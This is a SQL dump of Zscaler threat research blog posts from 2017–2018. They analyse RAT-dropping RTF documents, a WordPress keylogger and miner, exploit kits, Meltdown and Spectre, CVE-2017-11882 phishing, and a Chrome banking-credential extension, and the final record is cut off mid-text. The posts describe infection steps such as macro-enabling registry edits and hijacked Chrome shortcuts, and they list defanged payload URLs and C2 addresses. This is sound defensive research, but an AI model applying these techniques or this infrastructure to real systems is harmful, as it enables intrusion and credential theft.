INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (39, 'Malicious RTF document leading to NetwiredRC and Quasar RAT', 'Abhaykant Yadav,', 'February 20, 2018', 'Malware authors use a variety of clever methods to lure users into executing malicious documents. But the ThreatLabZ team recently observed a social engineering campaign with a unique approach. In these cases, malicious RTF documents basically force users to execute an embedded VBA macro, which starts the infection cycle by dropping Quasar RAT and NetWiredRC payloads.    The malicious RTF documents contain Excel sheets that include a macro, which downloads the additional payload on execution. The RTF document has the .doc extension and, while opening it in Microsoft Word, a macro warning popup (Fig. 1) is shown, with which a user can enable or disable the macro. However, with this malicious RTF document, Word shows repeated macro warning popups even if the user has clicked the “Disable Macros” button during the first warning.              Fig1: Macro warning popup         There is no way to stop these popups except to click on all of them or to force-quit Word. The current malicious RTF shows the macro warning popup 10 times, since this malicious RTF document has 10 embedded Excel sheets (see Fig. 2; the yellow dots highlight embedded Excel sheets).             Fig. 2: RTF document content         To achieve this effect, the malware author used “\\objupdate” control [1] for embedded Excel sheet objects (OLE object) (see Fig. 3). This function triggers the macro code inside the embedded Excel sheet to execute while the RTF document is being loaded in the MS Word application, and it’s what causes the multiple macro warning popups to appear.             Fig. 3: \\objupdate control in RTF         The same “\\objupdate” control was used in CVE-2017-0199 [2] . However, the current malicious document is not using this or any other vulnerability.        Fig. 4: Infection flow         Malicious macro analysis         We observed two variations of the malicious macro in this campaign (see Fig. 5). Although the macro code is identical, it is executing the PowerShell command to download intermediate payloads using Schtasks and cmd.exe (See Fig. 6).             Fig. 5: Macro code             Fig. 6: PowerShell commands    The malware also permanently enables macros for Word, PowerPoint, and Excel by doing registry modification.    Intermediate payload    Code in the macro uses PowerShell to download a malicious VBS file and saves it in the %PUBLIC% folder with the name svchost32.vbs.     This malicious VBS code (Fig7) performs the following actions -    Step 1      	  	Terminate all running instances of Microsoft Word and Excel process.  	  	  	Download final payload (using HTTPS protocol) and save it in %PUBLIC% folder with name svchost.exe.  	  	  	Execute the downloaded payload.  	          Fig7: Deobfuscated code of malicious VBS    Step 2      	  	Enable macro and disable protected view settings for Microsoft Word, PowerPoint and Excel (Version 11-16 except 13)  by doing registry modification.  	      Step 3      	  	Create a scheduled task with name as “WindowsUpdates” to run this payload (svchost32.vbs) after 200 minutes.  	      Step 4      	  	Delete “WindowsUpdate” scheduled task, created by macro code.  	      Step 5      	  	Download additional payload and save it in %PUBLIC% folder with name svchosts.exe. We did not see this payload download at the time of analysis and also noticed that this functionality was removed in the recent variants.  	           Final Payloads    We observed NetwiredRC and QusarRat malware as final payloads in this campaign. Both are Remote Admin Tools (RAT). QusarRat is an open source tool [3] and has features like remote webcam, remote shell and keylogging. Similarly, NetwiredRC has features like find file, remote shell, keylogging, screen capture, password stealing [4] etc..         IOCs      	  		  			  			MD5  			  			  			File format  			  			  			Downloaded from  			  		  		  			  			f073328b984dc8ac06b23af413ad2afb  			  			  			RTF  			  			  			files.catbox[.]moe/f9boo3.doc  			  		  		  			  			b127b79890f9fd09c83c24b13e7f45af  			  			  			RTF  			  			  			files.catbox[.]moe/rv6ihr.doc  			  		  		  			  			c26fa78766da89c0c66a59a4be1308ed  			  			  			RTF  			  			  			fast-cargo[.]com/images/file/vb/doc/41.doc  			  		  		  			  			fef2e48585db70ca52197375a23cce57  			  			  			RTF  			  			  			fast-cargo[.]com/images/file/vb/doc/39.doc  			  		  		  			  			db44996c3570d842f05c009616bec55a  			  			  			EXE  			  			  			asaigoldenrice[.]com/fedex/original_doc/fedex.exe  			  		  		  			  			3468E9349C0DE79B3E5F926B8BB4974B  			  			  			EXE  			  			  			asaigoldenrice[.]com/new/document.exe  			  		  		  			  			fa8a7d49d1871b75a9428c1ee35815e5  			  			  			EXE  			  			  			ksuoilfield[.]com/cgi-bim/ksuoilfield/MNBVVCXqwergfd1.exe  			  		  		  			  			2beabd88e7addd0bdf2a4eb06440f322  			  			  			EXE  			  			  			www.fast-cargo[.]com/images/file/vb/exe/door.exe  			  		  		  			  			c06fbecea30782c0e6410a68fa7988f6  			  			  			EXE  			  			  			www.fast-cargo[.]com/images/file/vb/exe/door.exe  			  		  	             	  		  			  			MD5  			  			  			Malware name  			  			  			C2  			  		  		  			  			db44996c3570d842f05c009616bec55a  			  			  			NetwiredRC  			  			  			shawnetw147.sytes[.]net:3136  			  		  		  			  			db44996c3570d842f05c009616bec55a  			  			  			NetwiredRC  			  			  			shawnetw147bkp.sytes[.]net:3136  			  		  		  			  			3468E9349C0DE79B3E5F926B8BB4974B  			  			  			NetwiredRC  			  			  			extensions14718.sytes[.]net:3324  			  		  		  			  			c06fbecea30782c0e6410a68fa7988f6  			  			  			QusarRat  			  			  			23.105.131[.]179:4782  			  		  		  			  			2beabd88e7addd0bdf2a4eb06440f322  			  			  			QusarRat  			  			  			173.46.85[.]227:1337  			  		  	           Conclusion    The Zscaler ThreatLabZ team is actively tracking and reviewing these payloads to ensure that our customers are protected from malicious RTF documents and other campaigns that rely on social engineering tactics to spread malware.', 'Malware', 'https://www.zscaler.com/blogs/research/malicious-rtf-document-leading-netwiredrc-and-quasar-rat');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (40, 'February 2018 Zscaler SSL Threat Report', 'Deepen Desai', 'February 06, 2018', 'SSL was introduced in 1994 and TLS in 1999 in response to growing concerns on the security of data being transmitted over the internet. However, the very protocol that was heralded as the ultimate cyber guard has ironically become an increasingly popular tool for cybercriminals to hide their nefarious acts. SSL encrypted traffic is often not inspected by organizations because it is assumed to come from trusted sources, however, that is no longer the case. While great for privacy, SSL is becoming a significant blind spot for companies as the percentage of encrypted traffic has risen sharply over the years. And, while obtaining the digital certificates for SSL used to require a rigorous vetting process for web sites, they can now be more easily obtained, in some cases, for free.    In this bi-annual research update, Zscaler ThreatLabZ examines SSL trends for the latter half of 2017. As the amount of SSL traffic continues to grow, cybercriminals are increasingly using encryption to launch and hide attacks, and free certificates have become an easy disguise for attackers.    According to Google’s Transparency Report,  during the month of December the percentage of pages loaded over HTTPS in Chrome in the US was nearly 80 percent, while on December 1, 2017, Mozilla reported that 66.5% of all pages loaded on Firefox were using HTTPS. In fact, since July 2017, the amount of SSL encrypted traffic on the Zscaler Cloud has increased by 10% to a total of 70% of all web traffic.    Threats in SSL Increase by 30%     Further, the Zscaler cloud now blocks an average of 800,000 SSL encrypted transactions per day because they contain advanced threats. This number is a 30% increase in just the last six months; in the first half of 2017, the average was 600,000 threats daily.    ThreatLabZ has seen that the SSL encrypted channel continues to be leveraged by the cybercriminals in the full attack cycle starting with      	the initial delivery vectors like malvertising, compromised sites, phishing pages, and malicious sites hosting the initial loading page;  	leading to the exploit and/or malware delivery stage – use of SSL to deliver exploit and/or malware payloads;  	and then to call home activity – many prevalent malware families are using SSL based Command and Control communication protocol.      Phishing Site Activity Jumps 300%     There was a significant increase, nearly 300%, in phishing attacks delivered over SSL in the Zscaler Cloud in 2017. Malicious content was delivered in various ways, but ThreatLabZ found two patterns more dominant than others. One method uses a phishing page hosted on a legitimate domain that has been compromised to deliver malware. Another method witnessed by our research team leverages newly registered domains with similar but incorrect addresses that are programmed to imitate the web sites of well-known brands. Some of the brands cybercriminals chose to imitate include DocuSign, Microsoft, Apple and Dropbox.        Diverse and Evolving Malware Payloads     ThreatLabZ saw the distribution of new, unique malicious payloads in the Zscaler Cloud Sandbox in the second half of 2017 that were leveraging SSL/TLS for communication with command and control (C&C) server activity, including malicious documents, APKs, and executables. Interestingly, the distribution of the types of malicious payloads remained the same as in the first half of 2017: 60% were Banking Trojan families, including Dridex, Emotet, Trickbot, Zbot, etc.; 25% were comprised of ransomware families; 12% were comprised of Infostealer Trojan families, including Fareit, Papras, etc.; and the last 3% were smaller families.   Many of these payloads were also delivered over SSL/TLS from such sites as Box, Dropbox, AWS, and Google.    Certain Certificates Are More Popular Vectors    In this update, ThreatLabZ investigated an arbitrary set of approximately 6,700 recent SSL transactions to gain deeper insight into the certificates involved. While the majority of these cases involved legitimate sites with valid certificates being compromised, there were also cases where free short-lived certificates were leveraged by the bad actors specifically to deliver malicious content.    ThreatLabZ then examined three types of certificates in a random sample of over 2800 certificates between November and December –  domain validated (DV), organization validated (OV) and extended validation (EV) – to understand which, if any, were most prevalent in the malicious transactions. What they learned was that DV certificates, which sometimes have a shorter validity period of three months and a less stringent vetting process, are the most abused certificates by cybercriminals. In fact, DV certificates, usually those that are free, were used in 74% of the cases in which SSL content was blocked in the Zscaler Cloud. Of the certificates inspected, 55% had a validity period of less than 12 months, with 35% of those having a validity period of three months or less. CAs responsible for distributing SSL certificates that the Zscaler Cloud blocked included a majority of the well-known authorities, including free as well as commercial CAs.    Web properties are quickly adopting SSL/TLS to curb privacy concerns, but without inspection of encrypted traffic, enterprises run the risk of an attack. Yet, SSL inspection can cause significant performance degradation on security appliances. A multi-layer defense-in-depth strategy that fully supports SSL/TLS inspection is essential to ensure enterprises are secure. Read more about Zscaler’s SSL Inspection here.', '', 'https://www.zscaler.com/blogs/research/february-2018-zscaler-ssl-threat-report');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (41, 'Compromised WordPress Sites Stealing Credentials with Keylogger', 'Derek Gooley', 'February 02, 2018', 'Introduction    WordPress compromises have become almost a mundane occurrence in the security industry. The ease and relative simplicity with which one can set up a WordPress instance, coupled with the multitude of available plugins, allows relatively inexperienced users to deploy a functional website quickly and with little hassle. Unfortunately, within this ever-growing library of plugins are many that - through neglect, incompetence, or both - fail to protect against various security threats. Exacerbating this issue are the thousands (millions?) of WordPress users who neglect to apply available security patches to the sites they administer. The result of this situation is the condition of the modern Internet that security researchers have to deal with daily: web sites using WordPress compromised by malicious actors to serve victims with malware, host phishing pages, redirects to exploit kits, and harvesting of credentials. While the frequency of these occurrences causes most of these campaigns to seem mundane and unremarkable, occasionally we discover a noteworthy variation that warrants public attention and analysis.    WordPress Keylogger and Coin Miner    Several months ago, researchers discovered a WordPress infection campaign that injected a JavaScript keylogger into compromised sites’ pages, recording the keystrokes of both users and administrators. The injected scripts also launched cryptocurrency mining scripts, a malicious attempt at revenue generation that recently has become all too familiar. This campaign, which hosted its malicious scripts at the domain “cloudflare[.]solutions” was shut down in early December.        Figure 1: Observed traffic to malicious WordPress script hosts    Shortly after the takedown of the controlling domain, however, a new variation on the campaign appeared, leading to a surge of compromised WordPress sites and affected users in mid-January. This campaign uses three different domains to hosts its malicious content, which, like its predecessor, appear at first glance to be legitimate CDN or hosting domains:    msdns[.]online, cdns[.]ws, cdjs[.]online    Each of these domains hosts slight variations of the same scripts, but they all have the common purpose to launch the JavaScript keylogger and initiate a cryptocurrency mining script. This campaign attempts to disguise itself as a benign Google Analytics library, in one instance naming the injected script “googleanalytics.js”.        Figure 2: cdns[.]ws/lib/googleanalytics.js, obfuscated    While the injected script is virtually identical across all three hosts, the script served by the domain “cdns[.]ws” is obfuscated with a JavaScript packer.        Figure 3: cdns[.]ws/lib/googleanalytics.js, deobfuscated    The initial script injected into WordPress pages includes three additional script files. The first, a script masquerading as a benign jQuery library, is a CoinHive cryptocurrency mining library. The second, “kl.js”, is the keylogger script, which records keystrokes and sends them back to the script host using the JavaScript WebSocket interface. “mnrstrtr.js” ostensibly short for “Miner Starter”, initializes and runs the mining library imported in the first script.    The “msdns.online” host splits this loader script into two parts, a “klldr.js” script, which loads the keylogger functionality, and “mnngldr.js”, which loads and runs the mining library.        Figure 4: cdns[.]ws/lib/kl.js keylogger script, deobfuscated    The contents of this script are designed to look like legitimate software, with references to Yandex statistics tracking and variable names that imply the functionality of a linter (software that is used to find programming errors in source code). The script connects to a the URL obfuscated at the top of the script using the WebSocket protocol and reports observed keystrokes.    Conclusion    The popularity of WordPress as a content management system, and its large library of third-party plugins, makes it an appealing target for criminals. As such, various campaigns using compromised WordPress sites to commit fraud and deliver malware are commonplace. This particular campaign, however, is interesting in that it does not require direct user interaction (e.g. with a phishing page) and does not install malicious software on the victim’s computer (e.g. with an exploit kit), instead opting to passively record user and administrator keystrokes and silently run cryptocurrency mining scripts in the background.    Zscaler protects against this threat, including coverage for both the keylogger and the coin miner parts of the campaign.', 'Compromise', 'https://www.zscaler.com/blogs/research/compromised-wordpress-sites-stealing-credentials-keylogger');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (42, 'Top Exploit Kit Activity Roundup - Winter 2018', 'Derek Gooley,', 'January 10, 2018', 'Overview    This is the seventh in a series of blogs collecting the recent activity of the current top exploit kits. Exploit kits are rapidly deployable software packages designed to leverage vulnerabilities in web browsers to deliver a malicious payload to a victim’s computer. Authors of exploit kits offer their services for sale, distributing malware for other malicious actors.    Find our previous roundup here.    RIG Exploit Kit    RIG EK has maintained its position as the most active exploit kit, but overall volume of RIG traffic was down over the fall quarter. In November, RIG activity declined significantly, and this trend continues throughout December. RIG continues to install ransomware, banking trojans, and cryptocurrency mining software on vulnerable systems.        Figure 1: RIG hits, September 2017 – December 2017        Figure 2: RIG Heat Map    Though still consistently active, the volume of RIG activity dropped significantly in November 2017. Global distribution of RIG activity has also changed since our last roundup. For the last quarter, virtually all observed RIG traffic has been within the United States, Russia, and Japan. This was unexpected, as previous analyses had shown an appreciable amount of activity in Europe, the rest of the Americas, and Southeast Asia.    Among the number of concurrent RIG campaigns this year, the “Seamless” campaign has garnered the most interest. In our Summer 2017 EK Roundup, we covered some of the details of the Seamless campaign, which began early in 2017. This campaign is primarily responsible for infecting victims with the Ramnit banking infostealer.    While most of the changes to RIG EK this year have been relatively insignificant, such as the constant variation of URI variable names in transactions with the exploit kit landing page, a recent usage of the “Punycode” URL encoding method caught the interest of many researchers. Punycode is a method of encoding Unicode characters within normal ASCII URL strings, which received a significant amount of attention this year for being used in numerous phishing attacks. Attackers use Punycode to display URLs in the victim’s browser that are visually similar to trusted websites in what is called an “IDN homograph attack”. Punycode was previously used by the Blackhole exploit kit in 2013 as part of an email spam campaign.        Figure 3: Observed RIG infection attempts using Punycode URLs    This campaign uses the Punycode URL xn--80af6acah5f[.]xn--p1acf, which encodes to the unicode URL рогаоыо[.]рус displaying Cyrillic characters. Other variations of this URL have been observed, including one detailed by Jérôme Segura.    Cryptocurrency mining payloads delivered by exploit kits are becoming increasingly common. These coin-mining packages typically mine alternative cryptocurrencies such as Monero, which have a greater emphasis on privacy and anonymity than Bitcoin. This aids the malicious actors profiting from the cryptocurrency mining in evading tracking by law enforcement agencies.    Earlier this fall we observed a one-off RIG campaign that used a different malicious redirect structure than the common RIG campaigns to deliver the exploit kit. This campaign infected victims with the Dofoil Trojan, which then installed the malicious BitCoinMiner cryptocurrency mining tool.        Figure 4: RIG redirect        Figure 5: RIG cycle    After the coin mining software is installed, it attempts to connect to 21072206[.]ru to begin mining.    Terror Exploit Kit    Terror EK is a more recent exploit kit discovered in late 2016. This kit was formed as an amalgamation of several active exploit kits, particularly using code and exploits taken directly from Sundown EK. Initially, Terror was relatively unsophisticated and was primarily used to infect victims with cryptocurrency mining packages, but has since undergone a number of upgrades.    Terror has been relatively active over the last quarter. Since our last roundup, we have observed several changes in the EK infrastructure and fingerprinting mechanisms.    The majority of detected Terror EK cycles were seen delivered via malvertising campaigns using the Propeller Ads network. Below are the few of domains that were seen redirecting users to the terror EK landing pages:    tqeobp89axcn[.]com    8b0b17dc1f9f8010[.]com    serve.popads[.]net/s?cid=XXX&iuid=XXX&ts=XXX&ps=XXX&pw=XXX&pl=!    pianodisagree[.]webcam    yakset[.]accountant    b-consulting[.]nl    The users were being redirected from few known pirate video streaming and online gaming sites seen below:    btcheat[.]com    mp3spongebob[.]tk    putlockers[.]fm    mp3old[.]tk    watch-series[.]is    widestream[.]io    download.planetlagu[.]online    flvto[.]biz    musicpleer[.]es    sockshare[.]net    onlineatv[.]com    Few of the changes that we saw as compared to start of the year is the use of encoding in the flash exploits used by the exploit kit. We had made detailed analysis of changes in the our previous blog on Terror EK    The previous EK Cycle can be seen below,        Figure 6: Terror EK cycle    Terror EK has begun using HTTPS instead of HTTP on its landing pages.        Figure 7: HTTPS connection to a Terror EK Landing Page    Heavy fingerprinting techniques using ad redirects to evade detections by only redirecting the users to the landing page when they meet specific target conditions. If the targets do not meet requirement then they are commonly redirected to fake Flash Player downloads, free online gaming sites or shopping portals.    The most recent Terror campaigns were seen using the ever-popular CVE-2016-0189 Internet Explorer exploit.    Other Exploit kits    Magnitude Exploit Kit    Magnitude EK is one of the longest-running exploit kits, first launched in 2013. This exploit kit has seen much lower volume activity in recent years, compared to RIG, Angler, and Neutrino (when the latter two were active). Significant changes in Magnitude campaigns are infrequent.    In our last roundup, we noted that Magnitude EK was primarily targeting Southeast Asian countries with malvertising campaigns. This trend continued through the fall quarter, with an increased presence of Magnitude activity specifically targeting South Korea.    Disdain Exploit Kit    Disdain EK is a brand new exploit kit that first appeared in early August. It shares code with Terror EK and uses the same URL pattern, but has many other distinct features. Disdain is currently operating at very low activity, but has been observed distributing the Kasidet infostealer. Malwarebytes has detailed Disdain’s use in alongside a “Fake Flash Player” social engineering attack.    Conclusion    Exploit kits pose a significant threat to users during simple web browsing. In the case of ransomware infections, the result could be the inability of a user to access his or her files. The techniques exploit kit authors use to hide their activities are frequently changing, and security researchers work hard to analyze and block these new threats.    To help avoid infections such as these, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements. Zscaler’s ThreatLabZ has confirmed coverage for these top exploit kits and subsequent payloads, ensuring protection for organizations using Zscaler’s Internet security platform.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/top-exploit-kit-activity-roundup-winter-2018');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (43, 'Meltdown and Spectre vulnerabilities: What you need to know', 'Deepen Desai,', 'January 05, 2018', 'Two major security vulnerabilities in processors, dubbed Meltdown and Spectre, were disclosed earlier this week by Google\'s Project Zero team. With the ability to allow attackers to gain unauthorized access to sensitive information in memory, Meltdown and Spectre represent a new class of microarchitectural attacks that use processor chip performance optimization features to exploit built-in security mechanisms.    Meltdown exploits the out-of-order execution feature of modern processors, allowing user-level programs to access kernel memory using processor caches as covert side channels. This is specific to the way out-of-order execution is implemented in the processors. This vulnerability has been assigned CVE-2017-5754.    Spectre exploits the speculative execution feature that is present in almost all processors in existence today. Two variants of Spectre are known and seem to depend on what is used to influence erroneous speculative execution. The first variant triggers speculative execution by performing a bounds check bypass and has been assigned CVE-2017-5753. The second variant uses branch target injection for the same effect and has been assigned CVE-2017-5715.    What is vulnerable?  Meltdown has the potential to affect every Intel processor that supports out-of-order execution; essentially all Intel processors since 1995. At the moment it is unclear if AMD and ARM processors are affected by Meltdown. Meltdown exploits the shared kernel-space mapping in the user-space virtual memory. Mitigating this vulnerability involves a technique known as Kernel Page Table Isolation (KPTI), which improves the isolation between kernel-space and user-space memory.    Spectre, on the other hand, affects almost every system in existence: desktops, laptops, cloud servers, tablets, and smartphones. Spectre has been exploited successfully on Intel, AMD, ARM, System Z, and Power 9 processors, among others. There is no single fix for this vulnerability, as it is at an architectural level, and mitigation requires fixes at each application level. Exploitation through JavaScript is also possible.      Meltdown vulnerability impact:      	Read arbitrary kernel memory from user space applications  	Fully virtualized machines are not affected (guest user space application cannot read host user/kernel space memory)  	Hypervisor escape is possible in paravirtualized environment (Xen, Docker, etc.)  	Sensitive information disclosure and privilege escalation attacks, as the dumped memory may contain password hashes, private keys, etc.      Spectre vulnerability impact:      	Theoretically allows random access to the entire memory-space  	Works across Virtual Machines  	Practical PoC for user-space to user-space attacks exist at the moment  	Harder to exploit than Meltdown  	Leaking user-space module addresses and thus bypassing ASLR for further attacks is possible (remote code execution)      What may be impacted?    PCs, laptops, servers, virtualization software, cloud servers, and so on, are all impacted if they are running the vulnerable processor.     Meltdown: All modern Intel x86 processors are vulnerable. Exploitation is theoretically possible on AMD and ARM, but not yet practically achieved.    Spectre: Intel, ARM, AMD, System Z, and Power 9 processors.    Is the Zscaler cloud infrastructure vulnerable?    Zscaler runs large parts of its cloud software on dedicated bare metal and does not share processors or memory with anyone else. This safeguards Zscaler infrastructure from attacks that can originate from foreign applications that may try to escape the virtual environment and access our memory regions. The attack can only be executed locally with an attacker running malicious code on the same hardware. Since our execution environment is highly guarded and closed, attackers cannot gain access to launch malicious code. Nonetheless, our cloud operations team is actively working on applying necessary patches after carefully evaluating their impact on performance and stability.    Zscaler customers running virtualized private components on their infrastructure should immediately update their hosts so as to prevent VM escape, in which another guest on the same host may browse memory regions used by other virtualized components. Only software updates to the hosts can protect the guests from these exploits, as a guest OS update will not suffice to protect against another compromised guest. It is the customer’s responsibility to apply updates relevant to their infrastructure.    More details on how Zscaler secures the cloud infrastructure from these vulnerabilities can be found in the post here    The Zscaler official trust post on this issue can be found here.    Zscaler security coverage for exploitation    We have deployed advanced threat signatures to detect some of the known JavaScript-based exploit POCs.    Advanced threat signatures: JS.Spectre.gen (browser exploit)    We are actively working on deploying an assembly-level detection for the exploitation technique involved in both the Meltdown and Spectre attacks. There are no active ITW exploit attempts of Meltdown or Spectre that Zscaler ThreatLabZ is currently aware of, but we will continue to actively monitor and ensure coverage for our customers.    Update - We have deployed assembly-level detection for the exploitation technique in Cloud Sandbox on January 12, 2018    Mitigation    Zscaler ThreatLabZ highly recommends applying both operating system and application-level patches to safeguard systems against these vulnerabilities.    OS-level patches currently available  FreeBSD patches being worked on: (https://www.freebsd.org/news/newsflash.html#event20180104:01)  Apple Mitigations (https://support.apple.com/en-us/HT208394)  Microsoft Advisory (https://support.microsoft.com/en-us/help/4073119/protect-against-speculative-execution-side-channel-vulnerabilities-in) Note: A small number of anti-virus applications performing unsupported calls to Windows Kernel memory are causing Blue Screen of Death (BSOD) after the use of this patch, so if you didn\'t receive the latest Windows security update, you may need to update the AV application first.    Browser patches  Chrome has suggested mitigation from Chrome 63 (released Dec 15) by enabling site-isolation feature. A comprehensive fix will be available in Chrome 64 (releasing Jan 23)  Firefox has short term mitigations available from version 57 (released November)  Microsoft Edge and IE updates are available along with the Windows patch    Virtualization application-level patches  VMware (https://www.vmware.com/us/security/advisories/VMSA-2018-0002.html)  XEN (https://xenbits.xen.org/xsa/advisory-254.html)  Citrix (https://support.citrix.com/article/CTX231399)    Recommendation for cloud apps  Amazon AWS (https://aws.amazon.com/de/security/security-bulletins/AWS-2018-013/)  Microsoft Azure (https://azure.microsoft.com/en-us/blog/securing-azure-customers-from-cpu-vulnerability/)  Google Cloud (https://support.google.com/faqs/answer/7622138)    Conclusion    For those of us in security, 2017 will be remembered for three major ransomware outbreaks and the Equifax data breach. And with such a significant security issue tagged within the first week of the year, 2018 promises to challenging for the security and tech industry.    While we are not aware of any exploit attempts for these vulnerabilities in the wild, it is only a matter of time before we start seeing them. We urge everyone to apply the available security patches.    Zscaler ThreatLabZ will continue to monitor and ensure coverage for any in-the-wild exploit attempts targeting these vulnerabilities.', 'Vulnerability', 'https://www.zscaler.com/blogs/research/meltdown-and-spectre-vulnerabilities-what-you-need-know');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (44, 'CVE-2017-11882 serving RAT and encrypted phishing campaign', 'Mohd Sadique', 'December 20, 2017', 'Introduction    Malicious documents remain one of the most popular vectors for cybercriminals to deliver malware payloads on a user\'s system. While we continue to see many types of VBA macro-based malware, there has been an increasing trend in malicious documents using the DDE protocol for delivering malware executables, which we wrote about last month. Microsoft released a security update last week that should significantly reduce the number of DDE-based attacks:    \"Microsoft has released an update for Microsoft Office that provides enhanced security as a defense-in-depth measure. The update disables the Dynamic Update Exchange protocol (DDE) in all supported editions of Microsoft Word.\" - Microsoft Security Advisory    Zscaler ThreatLabZ has been tracking a new vector involving malicious RTF document files weaponized with the recently disclosed Microsoft memory corruption vulnerability, CVE-2017-11882. In this blog, we will review a recent campaign leveraging this exploit and also share insights on encrypted phishing campaigns.    Infection cycle    In our research into this new exploit, we encountered spam phishing emails containing a malicious document attachment that leads to a Remote Access Trojan (RAT) and an encrypted phishing page.    The complete workflow of this campaign is shown below:        Fig 1: Workflow    The malware is received by the victim in a phishing email with a password-protected archive as the attachment.    An example of one such phishing email can be seen below:        Fig 2: Phishing scam email    The attachment is a password-protected ZIP file, which prevents auto-analysis systems from extracting and analyzing malicious files.    After the extraction of the  ZIP file with the password given in the email, we are presented with an RTF document file. This RTF file exploits the CVE-2017-11882 vulnerability in Microsoft Office software to execute malicious code. Using this vulnerability, the attacker can install malware, access data, or create a new account with full access rights.    Once the document is opened, it shows a plain document to the user. However, in the background it downloads and executes a RAT; as it does, it shows the phishing email content to the user, which leads to a phishing site.    The malicious RTF document file is shown below.        Fig 3: After HEX-to-ASCII conversion.    The RTF file contains the link to \"note,\"\' which is an HTML application that is remotely executed by mshta.exe.    In the header section of note.hta, there is VBScript code that is executed when the file is loaded.        Fig 4: Header section of note.hta    After decoding, the code looks like this.        Fig 5: Decoded PowerShell code inside VBScript of note.hta    The VBScript in note.hta creates a hidden PowerShell process, which downloads malware named clear.exe, stores it in %TEMP% directory with the name clear.exe, and executes it.    Clear.exe is inherently a Python module that is converted from Python to EXE.    After the reverse engineering of clear.exe, we get the malicious Python script, which looks like a RAT client.    The RAT client connects with the Command & Control (C&C) server IP 197.200.145[.]178 on port 2016.    It has a couple of tasks that will be executed when the C&C server sends a command request.        Fig 6: RAT commands (clear.exe)    RAT C&C commands supported:      	  	Kill – kill client connection  	  	  	Selfdestruct – kill client connection and remove traces of exploit  	  	  	Quit – close socket and connection  	  	  	Persistence – make RAT client persistent in system  	  	  	Scan – scan TCP ports  	  	  	Survey – run a system survey  	  	  	Cat <action> – output file on screen  	  	  	Execute <action> – execute a command  	  	  	Ls – list files in current directory  	  	  	Pwd – get working directory  	  	  	Unzip <action> – unzip a file  	  	  	Wget <action> – download a file from web  	      In addition to downloading this RAT executable, the malware will display a phishing email body pretending to come from the UK Government.    When note.hta is executed, it will display the following screen:        Fig 7: note.hta on execution    The hyperlink shown in Fig 7 leads to a phishing site as shown below.        Fig 8: Tax refund phishing site    The source code of this phishing site appears as follows:        Fig 9: AES-encrypted phishing site    The source code of this phishing site is encrypted using AES-256. It decrypts itself when the page loads using the Aes.Ctr.decrypt function.    The aim of this encrypted site is to avoid detection by automated site crawlers, web security systems, IDS/IPS systems, and so on.    This phishing site asks for personal information, including credit card details, and sends it to the attacker.        Fig 10: The phishing site steals the victim\'s personal information    Encrypted phishing campaigns    The AES-encrypted phishing campaign is an old tactic, with sites that are difficult to identify and difficult to catch by a crawler, which is why attackers are moving towards the encrypted phishing sites.    In the past few weeks, we\'ve found many similar encrypted phishing sites that are designed to look like the homepages of a UK government agency, Apple, PayPal, Netflix, AOL, and others.        Fig 11: Encrypted phishing sites hits during Nov-17 and Dec-17        Fig 12: Phishing site posing as Netflix homepage        Fig 13: Phishing site posing as Apple homepage        Fig 14: Phishing site posing as AOL homepage         Zscaler protections:    CVE-2017-11882 :    Microsoft has provided the update for this memory corruption vulnerability.    Zscaler threatname – “Microsoft CVE-2017-11882”    Malicious HTML application (note.hta):    Zscaler threatname – “VBS.TrojanDownloader.Gen”    Remote Access Trojan (RAT):    Zscaler threatname – “Win32.Trojan.RAT”    Encrypted phishing websites:    Zscaler threatname – “Phishing.Encrypted.Gen”', 'Analysis;Exploit;Malware;Microsoft;Phishing;Scam;Vulnerability', 'https://www.zscaler.com/blogs/research/cve-2017-11882-serving-rat-and-encrypted-phishing-campaign');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (45, 'Malicious Chrome Extension Steals Cookies and Credentials of Bank Customers', 'Atinderpal Singh,', 'December 18, 2017', 'Introduction\r\n\r\nWhile going through new malware samples in our cloud we came across an interesting payload written in Delphi which unlike traditional banking Trojans uses a malicious chrome extension for stealing sensitive banking information from Banco do Brasil customers.\r\n\r\nMain activity of this Trojan includes:\r\n\r\n\r\n	Downloads and installs Chrome extension files as .txt format\r\n	Search and modify target of all Google Chrome shortcuts to load malicious extension\r\n	Disables Google Chrome developer mode extension warning using code from Stackoverflow.\r\n	Targets Banco do Brasil (www2.bancobrasil.com.br and bb.com.br) customers\r\n	Steals cookies and credentials using extension\r\n\r\n\r\n\r\n\r\nFigure 1. Main Activity Flowchart\r\n\r\nAnalysis \r\n\r\nDelphi file contains URLs in the TEdit field, a timer to start activity and a button with an OnClick event that downloads Chrome extension files.\r\n\r\n\r\n\r\nFigure 2. Delphi form\r\n\r\nFirst, the callback on the FormShow event is triggered, which will get to the %APPDATA% path, decrypt the “/Microsoft/” string, and generate two random strings and connect them. After that, the timer callback triggers a button callback that, in turn, downloads the extension files from the server.\r\n\r\nThe button callback creates a directory structure path generated earlier by the FormShow callback and sets hidden attributes. It then downloads the remote files, also appends extension \".off\" and sets a hidden and read-only attribute for these files.\r\n\r\nChrome extension files are downloaded from following URLs: \r\n\r\n\r\n	185.109.163[.]73/mani/manifest.txt \r\n	185.109.163[.]73/mani/jquery.txt \r\n	185.109.163[.]73/mani/background.txt \r\n	185.109.163[.]73/mani/content.txt \r\n\r\n\r\nDelphi file checks to see if chrome is installed at “C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe” or “C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe”; it searches for all Google Chrome shortcuts in c:\\ drive and if found, change their destination to “{chrome.exe path} --load-extension=%appdata%/{extension folder} --allow-running-insecure-content.” This way, whenever Chrome is run through these shortcut files, the malicious extension is loaded.\r\n\r\nThe Trojan will then download a batch script from the following location and executes it:\r\n\r\n\r\n	185.109.163[.]73/mani/ba.txt\r\n\r\n\r\nThis batch script patches Google Chrome browser files to disable the developer mode extension warning that looks like: \r\n\r\n\r\n\r\nFigure 3. Chrome 